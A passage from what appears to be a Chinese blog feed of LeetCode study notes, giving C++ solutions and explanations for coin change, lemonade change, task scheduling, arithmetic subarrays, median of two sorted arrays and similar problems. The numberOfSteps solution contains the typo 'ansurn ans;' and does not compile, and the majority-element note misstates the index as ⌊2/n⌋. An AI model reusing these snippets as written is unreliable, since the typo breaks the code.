class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-keyword">if</span> (ratings[i] &gt; ratings[i + <span class="hljs-number">1</span>] &amp;&amp; left[i] &lt;= left[i + <span class="hljs-number">1</span>]) &#123;<br>                left[i] = left[i + <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>            &#125;<br>            ans += left[i];<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="钱币类">3. 钱币类</h1><h2 id="零钱兑换">零钱兑换</h2><blockquote><p><strong>状态定义</strong>：<code>dp[i]</code> 表示凑成金额<code>i</code> 所需的最少硬币数。</p><p><strong>状态转移</strong>：<code>dp[i] = min(dp[i], dp[i - coin] + 1)</code>，即当前金额<code>i</code> 的最优解是之前一个金额 <code>i - coin</code>的最优解加上一个硬币。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">coinChange</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; coins, <span class="hljs-type">int</span> amount)</span> </span>&#123;<br>        <span class="hljs-type">int</span> MAX = amount + <span class="hljs-number">1</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(amount + <span class="hljs-number">1</span>, MAX)</span></span>;<br>        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= amount; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; coins.<span class="hljs-built_in">size</span>(); j++) &#123;<br>                <span class="hljs-keyword">if</span> (coins[j] &lt;= i) &#123;<br>                    dp[i] = <span class="hljs-built_in">min</span>(dp[i], dp[i - coins[j]] + <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dp[amount] &gt; amount ? <span class="hljs-number">-1</span> : dp[amount];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="柠檬水找零">柠檬水找零</h2><blockquote><p>由于顾客只可能给你三个面值的钞票，而且我们一开始没有任何钞票，因此我们拥有的钞票面值只可能是5 美元，10 美元和 20 美元三种。基于此，我们可以进行如下的分类讨论。</p><ul><li><p>5 美元，由于柠檬水的价格也为 5美元，因此我们直接收下即可。</p></li><li><p>10 美元，我们需要找回 5 美元，如果没有 5美元面值的钞票，则无法正确找零。</p></li><li><p>20 美元，我们需要找回 15 美元，此时有两种组合方式，一种是一张 10美元和 5 美元的钞票，一种是 3 张 5美元的钞票，如果两种组合方式都没有，则无法正确找零。当可以正确找零时，两种找零的方式中我们更倾向于第一种，即如果存在5 美元和 10美元，我们就按第一种方式找零，否则按第二种方式找零，因为需要使用 5美元的找零场景会比需要使用 10 美元的找零场景多，我们需要尽可能保留 5美元的钞票。</p></li></ul><p>基于此，我们维护两个变量 five 和 ten 表示当前手中拥有的 5 美元和 10美元钞票的张数，从前往后遍历数组分类讨论即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">lemonadeChange</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; bills)</span> </span>&#123;<br>        <span class="hljs-type">int</span> five = <span class="hljs-number">0</span>, ten = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> bill: bills) &#123;<br>            <span class="hljs-keyword">if</span> (bill == <span class="hljs-number">5</span>) &#123;<br>                five++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (bill == <span class="hljs-number">10</span>) &#123;<br>                <span class="hljs-keyword">if</span> (five == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                five--;<br>                ten++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (five &gt; <span class="hljs-number">0</span> &amp;&amp; ten &gt; <span class="hljs-number">0</span>) &#123;<br>                    five--;<br>                    ten--;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (five &gt;= <span class="hljs-number">3</span>) &#123;<br>                    five -= <span class="hljs-number">3</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="将数字变成-0-的操作次数">将数字变成 0 的操作次数</h2><blockquote><p>将 num 与 1 进行位运算来判断 num 的奇偶性。记录操作次数时：</p><ul><li><p>如果 num 是奇数，我们需要加上一次减 1 的操作。</p></li><li><p>如果 num&gt;1，我们需要加上一次除以 2 的操作。</p></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numberOfSteps</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (num) &#123;<br>            ans += (num &gt; <span class="hljs-number">1</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) + (num &amp; <span class="hljs-number">0x01</span>);<br>            num &gt;&gt;= <span class="hljs-number">1</span>;<br>        &#125;<br><br>        ansurn ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="任务类">4. 任务类</h1><h2 id="任务调度器">任务调度器</h2><blockquote><p>在任意的情况下，需要的最少时间就是<code>(maxExec−1)(n+1)+maxCount</code> 和<code>∣task∣</code>中的较大值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">leastInterval</span><span class="hljs-params">(vector&lt;<span class="hljs-type">char</span>&gt;&amp; tasks, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; freq;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch: tasks) &#123;<br>            ++freq[ch];<br>        &#125;<br><br>        <span class="hljs-comment">// 最多的执行次数</span><br>        <span class="hljs-type">int</span> maxExec = <span class="hljs-built_in">max_element</span>(freq.<span class="hljs-built_in">begin</span>(), freq.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; u, <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; v) &#123;<br>            <span class="hljs-keyword">return</span> u.second &lt; v.second;<br>        &#125;)-&gt;second;<br>        <span class="hljs-comment">// 具有最多执行次数的任务数量</span><br>        <span class="hljs-type">int</span> maxCount = <span class="hljs-built_in">accumulate</span>(freq.<span class="hljs-built_in">begin</span>(), freq.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>, [=](<span class="hljs-type">int</span> acc, <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; u) &#123;<br>            <span class="hljs-keyword">return</span> acc + (u.second == maxExec);<br>        &#125;);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>((maxExec - <span class="hljs-number">1</span>) * (n + <span class="hljs-number">1</span>) + maxCount, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(tasks.<span class="hljs-built_in">size</span>()));<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="吃苹果的最大数目">吃苹果的最大数目</h2><blockquote><p>为了将吃苹果的数目最大化，应该使用贪心策略，在尚未腐烂的苹果中优先选择腐烂日期最早的苹果。为了得到腐烂日期最早的苹果，可以在优先队列中存储二元组，每个二元组表示苹果的腐烂日期和在该日期腐烂的苹果个数。</p><p>计算吃苹果的最大数目分成两个阶段，第一阶段是第 0 天到第 n−1天，即天数在数组下标范围内，第二阶段是第 n天及以后，即天数在数组下标范围外。</p><p>在第一阶段，由于每天树上都可能长出苹果，因此需要对每一天分别计算是否能吃到苹果，并更新优先队列。具体做法如下：</p><ol type="1"><li><p>将优先队列中的所有腐烂日期小于等于当前日期的元素取出，这些元素表示已经腐烂的苹果，无法食用；</p></li><li><p>根据 days 和 apples的当前元素计算当天长出的苹果的腐烂日期和数量，如果数量大于0，则将腐烂日期和数量加入优先队列；</p></li><li><p>如果优先队列不为空，则当天可以吃 1个苹果，将优先队列的队首元素的数量减 1，如果队首元素的数量变成 0则将队首元素取出。</p></li></ol><p>在第二阶段，由于树上不会再长出苹果，因此只需要考虑能吃到的苹果数量。由于优先队列中的每个元素的数量可能很大，因此需要根据当前日期和优先队列的队首元素的腐烂日期和数量计算能吃到的苹果数量。假设当前日期是第i 天，首先将优先队列中的所有腐烂日期小于等于 i的元素取出，如果优先队列不为空，则根据优先队列的队首元素计算能吃到的苹果数量。假设优先队列的队首元素的腐烂日期是x，数量是 y，其中 x&gt;i，则有 y 个苹果，距离腐烂还有 x−i天，因此能吃到的苹果数量是 curr=min(x−i,y)。将优先队列的队首元素 (x,y)取出并将日期增加curr，重复上述操作直到优先队列为空，即可得到吃苹果的最大数目。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">eatenApples</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; apples, vector&lt;<span class="hljs-type">int</span>&gt;&amp; days)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        priority_queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; pq;<br>        <span class="hljs-type">int</span> n = apples.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (idx &lt; n) &#123;<br>            <span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>() &amp;&amp; pq.<span class="hljs-built_in">top</span>().first &lt;= idx) &#123;<br>                pq.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            <span class="hljs-type">int</span> rottenDay = idx + days[idx];<br>            <span class="hljs-type">int</span> count = apples[idx];<br>            <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>                pq.<span class="hljs-built_in">emplace</span>(rottenDay, count);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!pq.<span class="hljs-built_in">empty</span>()) &#123;<br>                <span class="hljs-keyword">auto</span> curr = pq.<span class="hljs-built_in">top</span>();<br>                pq.<span class="hljs-built_in">pop</span>();<br>                curr.second--;<br>                <span class="hljs-keyword">if</span> (curr.second != <span class="hljs-number">0</span>) &#123;<br>                    pq.<span class="hljs-built_in">emplace</span>(curr.first, curr.second);<br>                &#125;<br>                ans++;<br>            &#125;<br>            idx++;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>() &amp;&amp; pq.<span class="hljs-built_in">top</span>().first &lt;= idx) &#123;<br>                pq.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (pq.<span class="hljs-built_in">empty</span>()) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">auto</span> curr = pq.<span class="hljs-built_in">top</span>();<br>            pq.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-type">int</span> num = <span class="hljs-built_in">min</span>(curr.first - idx, curr.second);<br>            ans += num;<br>            idx += num;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="矩形类">5. 矩形类</h1><h2 id="等差子数组">等差子数组</h2><blockquote><p>一个数组是等差数列，当且仅当该数组的元素可以以固定的步长（公差<code>d</code>）均匀分布。必要条件：对于一个子数组<code>[minv, maxv]</code>，如果<code>(maxv - minv) % (子数组的长度 - 1) != 0</code>，那么这个子数组一定不是等差数列。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">checkArithmeticSubarrays</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, vector&lt;<span class="hljs-type">int</span>&gt;&amp; l, vector&lt;<span class="hljs-type">int</span>&gt;&amp; r)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">bool</span>&gt; ans;<br>        <span class="hljs-type">int</span> n = l.<span class="hljs-built_in">size</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> left = l[i], right = r[i];<br>            <span class="hljs-type">int</span> minv = *<span class="hljs-built_in">min_element</span>(nums.<span class="hljs-built_in">begin</span>() + left, nums.<span class="hljs-built_in">begin</span>() + right + <span class="hljs-number">1</span>);<br>            <span class="hljs-type">int</span> maxv = *<span class="hljs-built_in">max_element</span>(nums.<span class="hljs-built_in">begin</span>() + left, nums.<span class="hljs-built_in">begin</span>() + right + <span class="hljs-number">1</span>);<br><br>            <span class="hljs-keyword">if</span> (minv == maxv) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> ((maxv - minv) % (right - left) != <span class="hljs-number">0</span>) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-type">int</span> d = (maxv - minv) / (right - left);<br>            <span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">seen</span><span class="hljs-params">(right - left + <span class="hljs-number">1</span>)</span></span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = left; j &lt;= right; j++) &#123;<br>                <span class="hljs-keyword">if</span> ((nums[j] - minv) % d != <span class="hljs-number">0</span>) &#123;<br>                    flag = <span class="hljs-literal">false</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-type">int</span> t = (nums[j] - minv) / d;<br>                <span class="hljs-keyword">if</span> (seen[t]) &#123;<br>                    flag = <span class="hljs-literal">false</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                seen[t] = <span class="hljs-literal">true</span>;<br>            &#125;<br>            ans.<span class="hljs-built_in">push_back</span>(flag);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="优势洗牌">优势洗牌</h2><blockquote><p>把nums1当成是田忌的马，nums2当成是齐威王的马。讨论田忌的下等马（nums1的最小值）：</p><ul><li>如果它能比过齐威王的下等马（nums2的最小值），那这一分田忌直接拿下；</li><li>如果它比不过齐威王的下等马，则用田忌的下等马比齐威王的上等马（nums2的最大值）。</li></ul><p>去掉这两匹马，问题变成一个规模更小（n−1）的子问题。重复上述过程，即得到了所有马的对应关系。代码实现时，由于nums2不能排序，我们可以创建一个下标数组 ids，对ids 排序，即 ids[0] 对应nums2中最小值的下标，ids[1] 对应 nums2中第二小值的下标，……。用双指针操作ids，从而知道每个下标所要对应的 nums1的元素，也就找到了所要求的nums1的排列。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">advantageCount</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ids</span><span class="hljs-params">(nums1.size())</span></span>;<br>        <span class="hljs-built_in">iota</span>(ids.<span class="hljs-built_in">begin</span>(), ids.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>); <span class="hljs-comment">// 使用 iota 函数初始化 ids 数组，使其元素值依次为 0 到 n-1</span><br><br>        <span class="hljs-built_in">sort</span>(nums1.<span class="hljs-built_in">begin</span>(), nums1.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-built_in">sort</span>(ids.<span class="hljs-built_in">begin</span>(), ids.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j) &#123; <br>            <span class="hljs-keyword">return</span> nums2[i] &lt; nums2[j]; <br>        &#125;);<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ans</span><span class="hljs-params">(nums1.size())</span></span>;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums1.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : nums1) &#123;<br>            ans[x &gt; nums2[ids[left]] ? ids[left++] : ids[right--]] = x;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="可被三整除的最大和">可被三整除的最大和</h2><blockquote><p>状态定义：</p><ul><li><code>f[0]</code>：表示模 3 余 0 的最大和。</li><li><code>f[1]</code>：表示模 3 余 1 的最大和。</li><li><code>f[2]</code>：表示模 3 余 2 的最大和。</li></ul><p>状态转移方程：<code>g[(i+num%3)%3]=max(g[(i+num%3)%3],f[i]+num)</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSumDivThree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; f = &#123;<span class="hljs-number">0</span>, INT_MIN, INT_MIN&#125;;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            vector&lt;<span class="hljs-type">int</span>&gt; g = f;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>                g[(i + num % <span class="hljs-number">3</span>) % <span class="hljs-number">3</span>] = <span class="hljs-built_in">max</span>(g[(i + num % <span class="hljs-number">3</span>) % <span class="hljs-number">3</span>], f[i] + num);<br>            &#125;<br>            f = <span class="hljs-built_in">move</span>(g);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> f[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分治篇</title>
    <link href="/2024/08/16/LeetCode/%E5%88%86%E6%B2%BB%E7%AF%87/"/>
    <url>/2024/08/16/LeetCode/%E5%88%86%E6%B2%BB%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="分解问题">1. 分解问题</h1><h2 id="多数元素">多数元素</h2><blockquote><p>如果将数组 <code>nums</code>中的所有元素按照单调递增或单调递减的顺序排序，那么下标为 ⌊2/n⌋的元素（下标从 <code>0</code> 开始）一定是众数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> nums[nums.<span class="hljs-built_in">size</span>() / <span class="hljs-number">2</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="寻找两个有序数组的中位数">寻找两个有序数组的中位数</h2><blockquote><p>使用双指针的方法在两个数组上进行线性扫描，找到中位数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = nums1.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = nums2.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> total_len = m + n;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;       <br>        <span class="hljs-type">int</span> prev = <span class="hljs-number">0</span>, curr = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录当前和前一个数，用于计算中位数</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= total_len / <span class="hljs-number">2</span>; k++) &#123;<br>            prev = curr; <br>            <span class="hljs-keyword">if</span> (i &lt; m &amp;&amp; (j &gt;= n || nums1[i] &lt; nums2[j])) &#123;<br>                curr = nums1[i++];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                curr = nums2[j++];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果总长度是奇数，返回 curr；如果是偶数，返回 (prev + curr) / 2.0</span><br>        <span class="hljs-keyword">if</span> (total_len % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> curr;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">return</span> (prev + curr) / <span class="hljs-number">2.0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 